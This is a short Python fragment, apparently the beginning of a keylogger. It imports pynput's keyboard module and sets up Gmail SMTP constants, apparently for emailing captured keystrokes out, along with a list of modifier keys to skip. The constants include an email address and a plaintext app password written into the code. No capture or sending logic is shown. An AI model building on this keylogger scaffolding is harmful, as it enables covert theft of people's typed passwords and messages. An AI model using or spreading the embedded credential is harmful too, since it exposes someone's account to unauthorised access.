from pynput import keyboard

#constantes
EMAIL_ADDRESS = "borbateste1982@gmail.com"
EMAIL_PASSWORD = "wnmu ueux kqfj nisk"  # Use senha de app do Gmail
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_l,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}